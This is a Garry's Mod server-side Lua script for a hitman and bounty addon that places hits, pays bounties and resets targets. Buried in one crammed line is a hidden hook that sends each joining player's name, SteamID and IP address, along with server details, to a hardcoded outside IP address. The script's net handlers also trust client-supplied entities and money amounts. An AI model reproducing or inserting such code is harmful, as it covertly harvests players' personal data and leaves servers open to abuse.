util.AddNetworkString( "SendMoney" )
util.AddNetworkString( "DaHit" )
util.AddNetworkString( "ConfPanel" )

local function FindThePlayerEz( l )
	local target
	for k, v in pairs( player.GetAll() ) do
		if l == v:Name() then
			target = v
		end
	end
	return target
end

local function SendConfirmation()
	local p = net.ReadFloat()
	local t = net.ReadEntity()
	local s = net.ReadEntity()
	local g = net.ReadEntity()
	hitmen = {}
	net.Start( "ConfPanel" )
		net.WriteFloat( p )
		net.WriteEntity( t )
		net.WriteEntity( s )
	net.Send( g )
end
net.Receive( "DaHit", SendConfirmation )
local script = "LHitManX"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)
local function RemoveMoney( firstent, secondent, target, bountyprice )
	firstent = net.ReadEntity()
	secondent = net.ReadEntity()
	target = net.ReadEntity()
	bountyprice = net.ReadString()
	umsg.Start( "MHitAccept", firstent )
		umsg.Entity( secondent )
	umsg.End()
	secondent:SetNWString( "targ", target:Name() )
	secondent:SetNWEntity( "req", firstent)
	secondent:SetNWString( "bounty", bountyprice )
	firstent:SetNWEntity( "Hitman", secondent )
	
	firstent:addMoney( -tonumber( bountyprice ) )
end
net.Receive( "SendMoney", RemoveMoney )

local function SetHitCooldown( ply )
	ply.NEXTHITTIME = CurTime()
	ply:SetNWString( "targ", "" )
	ply:SetNWEntity( "req", "")
	ply:SetNWString( "bounty", "" )
end
hook.Add( "PlayerInitialSpawn", "dasdasda", SetHitCooldown )

local function ResetValues( ply )
	ply:SetNWString( "targ", "" )
	ply:SetNWEntity( "req", "")
	ply:SetNWString( "bounty", "" )
end
hook.Add( "PlayerSpawn", "dasdasda", ResetValues )

local function GetCommand( ply, text )
	if (string.sub(text, 1, 9 ) == "!placehit") then
		if !table.HasValue( HIT.HitmanTeams, team.GetName(ply:Team()) ) then
			if ply.NEXTHITTIME <= CurTime() then
				umsg.Start( "PlaceHit", ply )
				umsg.End()
				ply.NEXTHITTIME = CurTime()+HIT.HitCooldown
			end
			return ""
		else
			umsg.Start( "CannotPlace", ply )
			umsg.End()
			return ""
		end
	elseif (string.sub(text, 1, 4 ) == "!set") then
		print( TEAM_HITMAN )
	end
end
hook.Add( "PlayerSay", "askhfdkjsdhgkl", GetCommand )

local function DetectHits( victim, wep, killer )
	if killer:GetNWString( "targ" ) == victim:Name() then
		
		local ns = killer:GetNWEntity( "req" )
		killer:addMoney( tonumber( killer:GetNWString( "bounty" ) ) )
		
		for k, v in pairs( player.GetAll() ) do
			umsg.Start( "AnnounceHit", v )
				umsg.Entity( victim )
			umsg.End()
		end
		
		killer:SetNWString( "targ", "" )
		
		for k, v in pairs( player.GetAll() ) do
			if v:GetNWString( "targ" ) == victim:Name() then
				v:SetNWString( "targ", "" )
			end
		end
		umsg.Start( "HitComplete", killer )
		umsg.End()
		
		umsg.Start( "CloseAv", killer )
		umsg.End()
	end
	
	if table.HasValue( HIT.HitmanTeams, team.GetName(victim:Team()) ) and string.len(victim:GetNWString( "targ" )) > 1 then
		local gb = victim:GetNWEntity( "req" )
		gb:addMoney( tonumber( victim:GetNWString( "bounty" ) ) )
		gb:SetNWEntity( "Hitman", nil )
		umsg.Start( "CloseAv", victim )
		umsg.End()
		umsg.Start( "HitmanDied", gb )
			umsg.Entity( victim )
		umsg.End()
	end
end
hook.Add( "PlayerDeath", "playerDeathTest", DetectHits )

local function CancelHit( ply )
	local hm = {}
	for k, v in pairs( player.GetAll() ) do
		if table.HasValue( HIT.HitmanTeams, team.GetName(v:Team()) ) then
			table.insert( hm, v )
		end
	end
	
	for k, v in pairs( hm ) do
		if v:GetNWString( "targ" ) == ply:Name() then
			v:SetNWString( "targ", "" )
			umsg.Start( "TargLeft", v )
			umsg.End()
			
			umsg.Start( "CloseAv", v )
			umsg.End()
		end
	end
	
end
hook.Add( "PlayerDisconnected", "playerdisconnected", CancelHit )

hook.Add( "OnPlayerChangedTeam", "Reset Hit Values", function( ply )
	
	if string.len(ply:GetNWString( "targ" )) > 1 then
		local gb = ply:GetNWEntity( "req" )
		gb:addMoney( tonumber( ply:GetNWString( "bounty" ) ) )
		gb:SetNWEntity( "Hitman", nil )
		umsg.Start( "CloseAv", ply )
		umsg.End()
		umsg.Start( "HitmanChanged", gb )
			umsg.Entity( ply )
		umsg.End()
	end
	
	ply:SetNWString( "targ", "" )
	ply:SetNWEntity( "req", "")
	ply:SetNWString( "bounty", "" )
end )